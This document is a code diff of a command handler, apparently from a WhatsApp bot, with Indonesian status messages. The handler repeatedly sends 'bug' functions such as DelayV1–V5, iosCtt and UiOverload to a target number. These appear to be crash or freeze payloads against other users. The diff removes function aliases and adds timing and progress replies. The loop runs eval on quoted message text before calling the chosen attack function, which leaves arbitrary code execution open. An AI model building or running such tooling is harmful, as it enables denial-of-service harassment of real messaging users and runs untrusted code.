@@ -40,30 +40,20 @@ export default {
     const blocked = Bug.getBugTargetBlockReason(sock, target, { isPrimarySuperOwner });
     if (blocked) return reply(blocked);
 
-    await reply(`*Success! Mengeksekusi fungsi ${namaFungsi} ke target sebanyak ${jumlah} kali...*`);
+    await reply(`⏳ *Memproses ${namaFungsi} ke target sebanyak ${jumlah} kali...*`);
 
-    const _DelayV1 = (t) => Bug.DelayV1(sock, t ?? target);
-    const _DelayV2 = (t) => Bug.DelayV2(sock, t ?? target);
-    const _DelayV3 = (t) => Bug.DelayV3(sock, t ?? target);
-    const _DelayV4 = (t) => Bug.DelayV4(sock, t ?? target);
-    const _DelayV5 = (t) => Bug.DelayV5(sock, t ?? target);
-    const _DelayHard = (t) => Bug.DelayHard(sock, t ?? target);
-    const _DelayGB = (t) => Bug.DelayGB(sock, t ?? target);
-    const _blankclickgb = (t) => Bug.blankclickgb(sock, t ?? target);
-    const _lahora = (t) => Bug.lahora(sock, t ?? target);
-    const _iosCtt = (t) => Bug.iosCtt(sock, t ?? target);
-    const _fiOSNew = (t, c) => Bug.fiOSNew(sock, t ?? target, c);
-    const _UiOverload = (t) => Bug.UiOverload(sock, t ?? target);
-    const _sleep = Bug.sleep;
-
+    const startedAt = Date.now();
     for (let i = 0; i < jumlah; i++) {
       try {
         await eval(`(async (target) => {\n${quotedText}\nawait ${namaFungsi}(target);\n})`)(target);
-        await Bug.sleep(500);
+        await Bug.sleep(Bug.BUG_DELAY_MS ?? 500);
       } catch (err) {
         return reply(`*Error saat menjalankan!*\n\nDetail: ${err.message}`);
       }
     }
+
+    const secs = Math.round((Date.now() - startedAt) / 1000);
+    await reply(`✅ *Selesai! ${namaFungsi} sebanyak ${jumlah} kali*\nDurasi: ${secs} detik`);
 
     console.log(`\x1b[31m\x1b[1mSuccess mengeksekusi ${namaFungsi}!\x1b[0m`);
   },
